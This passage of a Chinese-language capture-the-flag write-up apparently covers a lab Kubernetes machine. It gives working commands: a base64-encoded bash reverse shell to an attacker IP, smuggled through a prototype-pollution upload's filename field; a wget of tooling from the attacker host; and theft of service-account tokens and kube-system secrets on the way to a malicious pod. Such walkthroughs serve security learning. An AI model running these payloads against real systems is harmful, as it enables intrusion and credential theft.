<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt;/dev/tcp/10.10.14.7/4444 &lt;&amp;1</span><br><span class="line">YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjcvNDQ0NCA8JjE=</span><br><span class="line"></span><br><span class="line">curl -X PUT -H 'Content-Type: application/json' http://10.10.10.235:31337 --data '&#123;"auth":&#123;"name":"felamos","password":"Winter2021"&#125;,"message":&#123;"__proto__":&#123;"canUpload":true&#125;&#125;&#125;'</span><br><span class="line">&#123;"ok":true&#125;</span><br><span class="line"></span><br><span class="line">curl -X POST -H 'Content-Type: application/json' http://10.10.10.235:31337/upload --data-binary '&#123;"auth":&#123;"name":"felamos","password":"Winter2021"&#125;,"message":&#123;"__proto__":&#123;"canUpload":true&#125;&#125;,"filename":"; echo YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjcvNDQ0NCA8JjE= | base64 -d | bash"&#125;'</span><br><span class="line">&#123;"ok":true,"Uploaded_File":"; echo YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjcvNDQ0NCA8JjE= | base64 -d | bash"&#125;</span><br></pre></td></tr></table></figure>

<p>打到的是容器的root：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041407.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>容器root算user,得到user.txt:</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041408.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="kubectl"><a href="#kubectl" class="headerlink" title="kubectl"></a>kubectl</h1><p>根据clear-kubectl的内容，kubectl很可疑：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# cat clear-kubectl</span><br><span class="line">cat clear-kubectl</span><br><span class="line">* * * * * find / -name kubectl -exec rm &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>所以可以下载一个传上去：</p>
<ul>
<li>Install and Set Up kubectl on Linux | Kubernetes<br><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux" target="_blank" rel="noopener">https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.7:7777/kubectl-miao</span><br><span class="line">chmod +x ./kubectl-miao</span><br></pre></td></tr></table></figure>

<h2 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">./kubectl get namespace</span><br><span class="line">NAME              STATUS   AGE</span><br><span class="line">default           Active   86d</span><br><span class="line">dev               Active   86d</span><br><span class="line">kube-node-lease   Active   86d</span><br><span class="line">kube-public       Active   86d</span><br><span class="line">kube-system       Active   86d</span><br><span class="line"></span><br><span class="line">./kubectl get pods -n dev</span><br><span class="line">NAME                                READY   STATUS    RESTARTS   AGE</span><br><span class="line">devnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         86d</span><br><span class="line">devnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         86d</span><br><span class="line">devnode-deployment-cd86fb5c-qlxww   1/1     Running   29         86d</span><br><span class="line"></span><br><span class="line">./kubectl describe pod devnode-deployment-cd86fb5c-6ms8d -n dev</span><br><span class="line">Name:         devnode-deployment-cd86fb5c-6ms8d</span><br><span class="line">Namespace:    dev</span><br><span class="line">Priority:     0</span><br><span class="line">Node:         unobtainium/10.10.10.235</span><br><span class="line">Start Time:   Sun, 17 Jan 2021 18:16:21 +0000</span><br><span class="line">Labels:       app=devnode</span><br><span class="line">              pod-template-hash=cd86fb5c</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Status:       Running</span><br><span class="line">IP:           172.17.0.6</span><br><span class="line">IPs:</span><br><span class="line">  IP:           172.17.0.6</span><br><span class="line">Controlled By:  ReplicaSet/devnode-deployment-cd86fb5c</span><br><span class="line">Containers:</span><br><span class="line">  devnode:</span><br><span class="line">    Container ID:   docker://b49e97575744cee37fa94e1687e5328c5aa936e8d83a4fc9192bb41c36dd7076</span><br><span class="line">    Image:          localhost:5000/node_server</span><br><span class="line">    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c</span><br><span class="line">    Port:           3000/TCP</span><br><span class="line">    Host Port:      0/TCP</span><br><span class="line">    State:          Running</span><br><span class="line">      Started:      Wed, 14 Apr 2021 04:38:27 +0000</span><br><span class="line">    Last State:     Terminated</span><br><span class="line">      Reason:       Error</span><br><span class="line">      Exit Code:    137</span><br><span class="line">      Started:      Wed, 24 Mar 2021 16:01:28 +0000</span><br><span class="line">      Finished:     Wed, 24 Mar 2021 16:02:13 +0000</span><br><span class="line">    Ready:          True</span><br><span class="line">    Restart Count:  28</span><br><span class="line">    Environment:    &lt;none&gt;</span><br><span class="line">    Mounts:</span><br><span class="line">      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)</span><br><span class="line">Conditions:</span><br><span class="line">  Type              Status</span><br><span class="line">  Initialized       True</span><br><span class="line">  Ready             True</span><br><span class="line">  ContainersReady   True</span><br><span class="line">  PodScheduled      True</span><br><span class="line">Volumes:</span><br><span class="line">  default-token-rmcd6:</span><br><span class="line">    Type:        Secret (a volume populated by a Secret)</span><br><span class="line">    SecretName:  default-token-rmcd6</span><br><span class="line">    Optional:    false</span><br><span class="line">QoS Class:       BestEffort</span><br><span class="line">Node-Selectors:  &lt;none&gt;</span><br><span class="line">Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s</span><br><span class="line">                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s</span><br><span class="line">Events:          &lt;none&gt;</span><br></pre></td></tr></table></figure>

<h2 id="exploit-dev"><a href="#exploit-dev" class="headerlink" title="exploit dev"></a>exploit dev</h2><p>和前面一样的方式，修改ip端口打到devnode：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt;/dev/tcp/10.10.14.7/4445 &lt;&amp;1</span><br><span class="line">YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjcvNDQ0NSA8JjEKCg==</span><br><span class="line"></span><br><span class="line">curl -X PUT -H 'Content-Type: application/json' http://172.17.0.6:3000 --data '&#123;"auth":&#123;"name":"felamos","password":"Winter2021"&#125;,"message":&#123;"__proto__":&#123;"canUpload":true&#125;&#125;&#125;'</span><br><span class="line"></span><br><span class="line">curl -X POST -H 'Content-Type: application/json' http://172.17.0.6:3000/upload --data-binary '&#123;"auth":&#123;"name":"felamos","password":"Winter2021"&#125;,"message":&#123;"__proto__":&#123;"canUpload":true&#125;&#125;,"filename":"; echo YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjcvNDQ0NSA8JjEKCg== | base64 -d | bash"&#125;'</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021041409.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="dev-token"><a href="#dev-token" class="headerlink" title="dev token"></a>dev token</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> devnode</span></span><br><span class="line">cat /run/secrets/kubernetes.io/serviceaccount/token</span><br><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZXYiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGVmYXVsdC10b2tlbi1ybWNkNiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzQxZTdlNjYtNGIwZC00YTZlLWIzODgtOWE2ODQwNTVmOWRmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRldjpkZWZhdWx0In0.NdoMnigZmgPQR98lNmLdrF8iG_4yJMEVnyM0UHoZ4B2lh_Dve524sohFRhoBM3hxN2He7l0P3U2lSZXZO272tlmj48lly-_fGRfQ4xcXIbH7lvmiq2qHKcP4MJGql5X4NH4ereZvwkTvSyduRmEcw31qmn1Gres2eQxf4_2WBsC_4CAyMQPMktS1O6p54c_0BaX76ZGJjXKHsOXhrBZ1jzTcX8OGdlfss2eaMv1DtYkzqoK7Ug5Ru7LpUNsqfooWNdekYFCBj6OZxIwIgPbz0pgIPgByJAm6gUBnpaya4vnUzkIPBsek7rr5fz6OKxeggOo5ZjbLOyQSuVFpn43TIw</span><br></pre></td></tr></table></figure>

<h2 id="kube-system"><a href="#kube-system" class="headerlink" title="kube-system"></a>kube-system</h2><p>简单的枚举发现dev的token有权限获取kube-system命名空间的secrets：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> ./kubectl -n kube-system --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZXYiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGVmYXVsdC10b2tlbi1ybWNkNiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzQxZTdlNjYtNGIwZC00YTZlLWIzODgtOWE2ODQwNTVmOWRmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRldjpkZWZhdWx0In0.NdoMnigZmgPQR98lNmLdrF8iG_4yJMEVnyM0UHoZ4B2lh_Dve524sohFRhoBM3hxN2He7l0P3U2lSZXZO272tlmj48lly-_fGRfQ4xcXIbH7lvmiq2qHKcP4MJGql5X4NH4ereZvwkTvSyduRmEcw31qmn1Gres2eQxf4_2WBsC_4CAyMQPMktS1O6p54c_0BaX76ZGJjXKHsOXhrBZ1jzTcX8OGdlfss2eaMv1DtYkzqoK7Ug5Ru7LpUNsqfooWNdekYFCBj6OZxIwIgPbz0pgIPgByJAm6gUBnpaya4vnUzkIPBsek7rr5fz6OKxeggOo5ZjbLOyQSuVFpn43TIw auth can-i --list</span><br><span class="line"> Resources                                       Non-Resource URLs                     Resource Names   Verbs</span><br><span class="line">selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]</span><br><span class="line">selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]</span><br><span class="line">secrets                                         []                                    []               [get list]</span><br><span class="line">                                                [/.well-known/openid-configuration]   []               [get]</span><br><span class="line">                                                [/api/*]                              []               [get]</span><br><span class="line">                                                [/api]                                []               [get]</span><br><span class="line">                                                [/apis/*]                             []               [get]</span><br><span class="line">                                                [/apis]                               []               [get]</span><br><span class="line">                                                [/healthz]                            []               [get]</span><br><span class="line">                                                [/healthz]                            []               [get]</span><br><span class="line">                                                [/livez]                              []               [get]</span><br><span class="line">                                                [/livez]                              []               [get]</span><br><span class="line">                                                [/openapi/*]                          []               [get]</span><br><span class="line">                                                [/openapi]                            []               [get]</span><br><span class="line">                                                [/openid/v1/jwks]                     []               [get]</span><br><span class="line">                                                [/readyz]                             []               [get]</span><br><span class="line">                                                [/readyz]                             []               [get]</span><br><span class="line">                                                [/version/]                           []               [get]</span><br><span class="line">                                                [/version/]                           []               [get]</span><br><span class="line">                                                [/version]                            []               [get]</span><br><span class="line">                                                [/version]                            []               [get]</span><br></pre></td></tr></table></figure>

<h2 id="secrets"><a href="#secrets" class="headerlink" title="secrets"></a>secrets</h2><p>获取secrets，其中daemon-set-controller有create pod权限：</p>
<ul>
<li>DaemonSet | Kubernetes<br><a href="https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/" target="_blank" rel="noopener">https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">./kubectl --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZXYiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGVmYXVsdC10b2tlbi1ybWNkNiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzQxZTdlNjYtNGIwZC00YTZlLWIzODgtOWE2ODQwNTVmOWRmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRldjpkZWZhdWx0In0.NdoMnigZmgPQR98lNmLdrF8iG_4yJMEVnyM0UHoZ4B2lh_Dve524sohFRhoBM3hxN2He7l0P3U2lSZXZO272tlmj48lly-_fGRfQ4xcXIbH7lvmiq2qHKcP4MJGql5X4NH4ereZvwkTvSyduRmEcw31qmn1Gres2eQxf4_2WBsC_4CAyMQPMktS1O6p54c_0BaX76ZGJjXKHsOXhrBZ1jzTcX8OGdlfss2eaMv1DtYkzqoK7Ug5Ru7LpUNsqfooWNdekYFCBj6OZxIwIgPbz0pgIPgByJAm6gUBnpaya4vnUzkIPBsek7rr5fz6OKxeggOo5ZjbLOyQSuVFpn43TIw -n kube-system get secrets</span><br><span class="line"></span><br><span class="line">NAME                                             TYPE                                  DATA   AGE</span><br><span class="line">attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      86d</span><br><span class="line">bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      86d</span><br><span class="line">c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      86d</span><br><span class="line">certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      86d</span><br><span class="line">clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      86d</span><br><span class="line">coredns-token-dbp92                              kubernetes.io/service-account-token   3      86d</span><br><span class="line">cronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      86d</span><br><span class="line">daemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      86d</span><br><span class="line">default-token-l85f2                              kubernetes.io/service-account-token   3      86d</span><br><span class="line">deployment-controller-token-cwgst                kubernetes.io/service-account-token   3      86d</span><br><span class="line">disruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      86d</span><br><span class="line">endpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      86d</span><br><span class="line">endpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      86d</span><br><span class="line">endpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      86d</span><br><span class="line">expand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      86d</span><br><span class="line">generic-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      86d</span><br><span class="line">horizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      86d</span><br><span class="line">job-controller-token-h6kg8                       kubernetes.io/service-account-token   3      86d</span><br><span class="line">kube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      86d</span><br><span class="line">namespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      86d</span><br><span class="line">node-controller-token-k6p6v                      kubernetes.io/service-account-token   3      86d</span><br><span class="line">persistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      86d</span><br><span class="line">pod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      86d</span><br><span class="line">pv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      86d</span><br><span class="line">pvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      86d</span><br><span class="line">replicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      86d</span><br><span class="line">replication-controller-token-jz8k8               kubernetes.io/service-account-token   3      86d</span><br><span class="line">resourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      86d</span><br><span class="line">root-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      86d</span><br><span class="line">service-account-controller-token-44bfm           kubernetes.io/service-account-token   3      86d</span><br><span class="line">service-controller-token-pzjnq                   kubernetes.io/service-account-token   3      86d</span><br><span class="line">statefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      86d</span><br><span class="line">storage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      86d</span><br><span class="line">token-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      86d</span><br><span class="line">ttl-controller-token-z87px                       kubernetes.io/service-account-token   3      86d</span><br></pre></td></tr></table></figure>

<h2 id="daemon-set-token"><a href="#daemon-set-token" class="headerlink" title="daemon-set token"></a>daemon-set token</h2><p>获取daemon-set token：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">./kubectl --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZXYiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGVmYXVsdC10b2tlbi1ybWNkNiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMzQxZTdlNjYtNGIwZC00YTZlLWIzODgtOWE2ODQwNTVmOWRmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRldjpkZWZhdWx0In0.NdoMnigZmgPQR98lNmLdrF8iG_4yJMEVnyM0UHoZ4B2lh_Dve524sohFRhoBM3hxN2He7l0P3U2lSZXZO272tlmj48lly-_fGRfQ4xcXIbH7lvmiq2qHKcP4MJGql5X4NH4ereZvwkTvSyduRmEcw31qmn1Gres2eQxf4_2WBsC_4CAyMQPMktS1O6p54c_0BaX76ZGJjXKHsOXhrBZ1jzTcX8OGdlfss2eaMv1DtYkzqoK7Ug5Ru7LpUNsqfooWNdekYFCBj6OZxIwIgPbz0pgIPgByJAm6gUBnpaya4vnUzkIPBsek7rr5fz6OKxeggOo5ZjbLOyQSuVFpn43TIw -n kube-system describe secrets daemon-set-controller-token-cb825</span><br><span class="line"></span><br><span class="line">Name:         daemon-set-controller-token-cb825</span><br><span class="line">Namespace:    kube-system</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  kubernetes.io/service-account.name: daemon-set-controller</span><br><span class="line">              kubernetes.io/service-account.uid: 58a5014a-5be1-4144-8256-ebbe3b0d3eff</span><br><span class="line"></span><br><span class="line">Type:  kubernetes.io/service-account-token</span><br><span class="line"></span><br><span class="line">Data</span><br><span class="line">====</span><br><span class="line">ca.crt:     1066 bytes</span><br><span class="line">namespace:  11 bytes</span><br><span class="line">token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYWVtb24tc2V0LWNvbnRyb2xsZXItdG9rZW4tY2I4MjUiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFlbW9uLXNldC1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiNThhNTAxNGEtNWJlMS00MTQ0LTgyNTYtZWJiZTNiMGQzZWZmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmRhZW1vbi1zZXQtY29udHJvbGxlciJ9.Sube7Qn6hgQI_E9KRKOgSCzBnfbivCB_M_nUXAT-Hxh_i9ZLqGNeUlFzgnbHpGKMaKoyhM01rkMazQkndPq_RvfFBSq27ZKxPEVZW6lT0x3pN3m4aHbb0ZoYR6mM6ppR4u2aYgB6jpQcx7jkkyb-wzlLHHig6BIbpasJnAFc2SoadGEcSghASGwzqHMRbBVtltMc_IxEsZgxNciI4ehakPSc4VJQ1ah6K7xLuJDXJf8RYz9yVpwZXUeE6xhlNqDNzlXDaGXImP7QdTSI5IcCoe6hbjnoJHKIN1oijQ1sWQbuG6d0PxjeEEilKUtfuwcWCRSUP5Qx1LJ6-GG6TcwiFg</span><br></pre></td></tr></table></figure>

<h2 id="images"><a href="#images" class="headerlink" title="images"></a>images</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kubectl get pods --all-namespaces --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYWVtb24tc2V0LWNvbnRyb2xsZXItdG9rZW4tY2I4MjUiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFlbW9uLXNldC1jb250cm9sbGVyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiNThhNTAxNGEtNWJlMS00MTQ0LTgyNTYtZWJiZTNiMGQzZWZmIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmRhZW1vbi1zZXQtY29udHJvbGxlciJ9.Sube7Qn6hgQI_E9KRKOgSCzBnfbivCB_M_nUXAT-Hxh_i9ZLqGNeUlFzgnbHpGKMaKoyhM01rkMazQkndPq_RvfFBSq27ZKxPEVZW6lT0x3pN3m4aHbb0ZoYR6mM6ppR4u2aYgB6jpQcx7jkkyb-wzlLHHig6BIbpasJnAFc2SoadGEcSghASGwzqHMRbBVtltMc_IxEsZgxNciI4ehakPSc4VJQ1ah6K7xLuJDXJf8RYz9yVpwZXUeE6xhlNqDNzlXDaGXImP7QdTSI5IcCoe6hbjnoJHKIN1oijQ1sWQbuG6d0PxjeEEilKUtfuwcWCRSUP5Qx1LJ6-GG6TcwiFg -o json</span><br></pre></td></tr></table></figure>

<h2 id="evil-pod"><a href="#evil-pod" class="headerlink" title="evil pod"></a>evil pod</h2><p>之后就是使用daemon-set token创建恶意pod，执行命令：</p>
